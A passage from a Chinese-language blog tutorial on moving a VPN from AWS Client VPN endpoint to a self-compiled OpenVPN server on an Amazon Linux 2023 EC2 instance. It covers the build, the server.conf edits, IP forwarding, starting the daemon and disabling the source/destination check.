<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://swupdate.openvpn.org/community/releases/openvpn-2.6.6.tar.gz</span><br><span class="line">tar xzvf openvpn-2.6.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openvpn-2.6.6</span><br><span class="line">./configure --prefix=/usr/local/openvpn</span><br><span class="line">make</span><br><span class="line"><span class="comment"># configure 和 make 的时候会出一些错误</span></span><br><span class="line"><span class="comment"># 多半是缺少什么包导致的，见招拆招吧，</span></span><br><span class="line"><span class="comment"># 缺什么直接用 sudo dnf install xxx 装上即可</span></span><br><span class="line">sudo make install</span><br><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/openvpn/etc</span><br><span class="line">sudo <span class="built_in">cp</span> ca.crt /usr/local/openvpn/etc/</span><br><span class="line">sudo <span class="built_in">cp</span> server.crt /usr/local/openvpn/etc/</span><br><span class="line">sudo <span class="built_in">cp</span> server.key /usr/local/openvpn/etc/</span><br><span class="line"><span class="comment"># 因为是迁移，所以这里把原来有的 ca.crt、server.crt 和 </span></span><br><span class="line"><span class="comment"># server.key 拷贝到 /usr/local/openvpn/etc/ 目录下</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/openvpn/etc</span><br><span class="line">sudo wget https://github.com/OpenVPN/openvpn/raw/master/sample/sample-config-files/server.conf</span><br><span class="line"><span class="comment"># 上面是从 OpenVPN 官方代码库里把服务器配置例子扒下来</span></span><br></pre></td></tr></table></figure>

<h3 id="配置-OpenVPN-服务器"><a href="#配置-OpenVPN-服务器" class="headerlink" title="配置 OpenVPN 服务器"></a>配置 OpenVPN 服务器</h3><p>还是在 EC2 上，<code>/usr/local/openvpn/etc</code> 目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/local/openvpn/etc/server.conf</span><br><span class="line"><span class="comment"># 以官方例子为模版修改服务器配置文件</span></span><br></pre></td></tr></table></figure>

<p>有几个地方需要改：</p>
<ul>
<li>cipher 这一行改成 <code>cipher AES-256-GCM</code></li>
<li>dh 这一行改成 <code>dh none</code></li>
<li>user 这一行改成 <code>user nobody</code></li>
<li>group 这一行改成 <code>group nobody</code></li>
<li>port 这一行是端口号，自己看着改，缺省 1194 也可以</li>
<li>proto 这一行建议改成 <code>proto tcp</code></li>
<li>explicit-exit-notify 这一行如果 proto 设成 tcp 的话要改成 <code>explicit-exit-notify 0</code></li>
<li>cert 这一行改成 <code>cert /usr/local/openvpn/etc/server.crt</code></li>
<li>key 这一行改成 <code>key /usr/local/openvpn/etc/server.key</code></li>
<li>ca 这一行改成 <code>ca /usr/local/openvpn/etc/ca.crt</code></li>
<li>push “route 这一行需要按需写上要推送的路由（每行写一段），比如 <code>push &quot;route 172.16.0.0 255.240.0.0&quot;</code></li>
</ul>
<h3 id="Linux-上打开包转发"><a href="#Linux-上打开包转发" class="headerlink" title="Linux 上打开包转发"></a>Linux 上打开包转发</h3><p>EC2 上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt; /etc/sysctl.d/10-OpenVPN.conf</span><br><span class="line">sudo sysctl -p /etc/sysctl.d/10-OpenVPN.conf</span><br></pre></td></tr></table></figure>

<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><p>EC2 上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/openvpn/sbin/openvpn \</span><br><span class="line">    --config /usr/local/openvpn/etc/server.conf \</span><br><span class="line">    --daemon</span><br></pre></td></tr></table></figure>

<h3 id="AWS-上修改-EC2-的设置"><a href="#AWS-上修改-EC2-的设置" class="headerlink" title="AWS 上修改 EC2 的设置"></a>AWS 上修改 EC2 的设置</h3><p>所有做包转发的 EC2，都需要强制关掉 AWS 官方的 source&#x2F;destination check。方法是：</p>
<p><code>Actions</code>-&gt;<code>Networking</code>-&gt;<code>change source/destination check</code>，然后点“stop”</p>
<p>至此，VPN 从 AWS 的 <code>Client VPN endpoint</code> 已经迁移到我们自己的 EC2 上了，以前的客户端，只需要改下 remote 那一行的服务器地址为 EC2 的公网地址，以及将 proto 改成 tcp（Client VPN endpoint 缺省是 udp，而且不能改）即可继续使用，连新的 VPN 服务器。</p>
]]></content>
      <tags>
        <tag>OpenVPN</tag>
        <tag>AWS</tag>
        <tag>AL2023</tag>
        <tag>Amazon Linux 2023</tag>
        <tag>EC2</tag>
        <tag>Client VPN endpoint</tag>
      </tags>
  </entry>
</search>
